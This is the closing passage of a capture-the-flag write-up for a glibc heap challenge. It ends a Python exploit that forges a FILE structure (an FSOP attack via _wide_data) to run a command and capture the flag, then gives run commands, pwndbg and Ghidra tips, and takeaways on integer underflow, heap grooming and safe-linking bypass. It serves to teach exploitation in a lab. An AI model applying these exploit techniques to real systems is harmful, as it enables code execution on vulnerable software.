        if len(cmd) >= 0x20:
            raise ValueError("cmd too long (must be <0x20)")

        fake = bytearray(b"\x00" * 0xE0)  # avoid corrupting stdout
        fake[: len(cmd)] = cmd
        fake[len(cmd)] = 0

        buf = wide_data_addr + 0x60
        struct.pack_into("<Q", fake, 0x20, buf)
        struct.pack_into("<Q", fake, 0x28, buf + 1)
        struct.pack_into("<Q", fake, 0x30, buf + 8)
        struct.pack_into("<Q", fake, 0x38, buf)
        struct.pack_into("<Q", fake, 0x40, buf + 8)

        lock_addr = wide_data_addr + 0x40
        struct.pack_into("<Q", fake, 0x88, lock_addr)
        struct.pack_into("<Q", fake, 0xA0, wide_data_addr)
        struct.pack_into("<I", fake, 0xC0, 1)  # _mode > 0
        struct.pack_into("<Q", fake, 0x68, 0)  # _wide_data->buf_base triggers wdoallocbuf
        struct.pack_into("<Q", fake, 0xD8, wfile_jumps_addr)

        create(io, 1, 0xF8, bytes(fake))

        # Trigger exit (flush-all over _IO_list_all).
        choice(io, 4)

        data = io.recvrepeat(5.0)
        m = re.search(rb"lactf\{[^}]+\}", data)
        if not m:
            raise RuntimeError(f"flag not found; tail={data[-400:]!r}")
        print(m.group(0).decode())
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())
```

---

## Commands Reference

### Running the Exploit

```bash
# Local (with correct libc)
python3 exploit.py

# Remote
python3 exploit.py --remote --host chall.lac.tf --port 31144
```

### pwndbg Commands for Analysis

```bash
# Start debugging
gdb ./chall
pwndbg> set follow-fork-mode child

# Breakpoints
pwndbg> b *create_note
pwndbg> b *delete_note
pwndbg> b *read_data_into_note

# Heap inspection
pwndbg> heap chunks           # Show all chunks
pwndbg> bins                  # Show tcache/fastbin/unsorted bin state
pwndbg> tcache                # Show tcache structure
pwndbg> arena                 # Show main_arena

# Memory examination
pwndbg> x/40gx 0x555555756290 # Examine heap memory
pwndbg> telescope 0x...       # Dereference pointers recursively

# Safe-linking decode
pwndbg> p/x (chunk_addr >> 12) ^ fd_value

# Context
pwndbg> context               # Show registers, code, stack, backtrace
pwndbg> context code          # Show only disassembly
pwndbg> context stack         # Show only stack

# Execution control
pwndbg> r                     # Run
pwndbg> c                     # Continue
pwndbg> ni                    # Next instruction
pwndbg> si                    # Step instruction
pwndbg> finish                # Run until return
```

### Ghidra Analysis Tips

1. Load binary in Ghidra
2. Auto-analyze with default settings
3. Navigate to `read_data_into_note` function
4. Look for integer arithmetic on unsigned types
5. Decompile to C for easier understanding
6. Use "Window → Defined Strings" to find interesting strings
7. Use "Window → Functions" to see all functions

### Useful glibc Source References

- `malloc/malloc.c` - Heap allocator implementation
- `libio/fileops.c` - FILE operations
- `libio/wfileops.c` - Wide-character FILE operations
- `malloc/arena.c` - Arena management

---

## Key Takeaways

1. **Integer underflows** in unsigned arithmetic can lead to massive overflows
2. **Heap feng shui** is possible even with limited slots by repeatedly allocating/freeing
3. **Safe-linking** can be reversed with two leaks and mathematical constraints
4. **FSOP** is a powerful technique when GOT/hooks are protected
5. **Fake structures** require careful setup but enable complex attacks
6. **Dynamic analysis** with pwndbg is essential for understanding heap state
7. **Offset calculations** are critical - small mistakes break the whole exploit

---
